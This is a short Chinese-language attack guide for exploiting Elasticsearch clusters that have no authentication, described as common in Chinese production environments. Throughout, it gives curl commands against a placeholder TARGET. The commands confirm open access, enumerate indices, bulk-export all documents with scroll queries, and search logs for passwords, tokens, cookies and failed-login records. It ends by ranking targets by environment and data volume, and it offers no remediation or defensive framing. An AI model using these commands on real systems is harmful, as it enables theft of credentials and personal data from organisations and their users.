# Elasticsearch 未授权访问发现与利用

中国大量生产环境 Elasticsearch 因未配置认证或错误配置 `xpack.security.enabled: false`，暴露 9200/9201 端口。ES 日志数据中常含高价值信息。

## 快速确认

```bash
# 认证未开启时返回集群信息
curl -sk "http://TARGET:9200/"
# {"name":"es-node-01","cluster_name":"logging-prod","version":{"number":"8.11.0"}}

# 认证开启时返回：
# {"error":{"root_cause":[{"type":"security_exception"}]}}
```

## 索引枚举

```bash
# 全部索引
curl -sk "http://TARGET:9200/_cat/indices?v"

# 自定义排序
curl -sk "http://TARGET:9200/_cat/indices?h=index,docs.count,store.size&s=docs.count:desc&v"

# JSON 格式
curl -sk "http://TARGET:9200/_cat/indices?format=json" | python3 -m json.tool
```

## 数据提取

```bash
# 采样
curl -sk "http://TARGET:9200/index-name/_search?size=5&pretty" | jq '.hits.hits[]._source'

# 批量导出全部文档（大索引请小心）
curl -sk -X POST "http://TARGET:9200/index-name/_search?scroll=5m&size=1000" \
  -H "Content-Type: application/json" -d '{"query":{"match_all":{}}}' > scroll_batch.json

# Count 特定索引文档数
curl -sk "http://TARGET:9200/index-name/_count"
```

## 高价值搜索

```bash
# 搜索含 password 的日志
curl -sk "http://TARGET:9200/_search?q=password&pretty&size=50"

# 搜索含 token 的日志
curl -sk "http://TARGET:9200/_search?q=token&pretty&size=50"

# 搜索含 set-cookie 的日志
curl -sk "http://TARGET:9200/_search?q=set-cookie&pretty&size=50"

# 搜索含 401/403 的日志（认证失败记录）
curl -sk "http://TARGET:9200/_search?q=status:401&pretty&size=50"
```

## 敏感指标

- 集群名包含 `prod` / `production` / `日志` → 生产环境
- 索引名包含 `-audit-` / `-security-` → 权限审查
- 索引名包含 `-app-` / `-service-` → 应用调试日志（高价值）
- `store.size` 越大 → 数据量越大，有价值信息越多
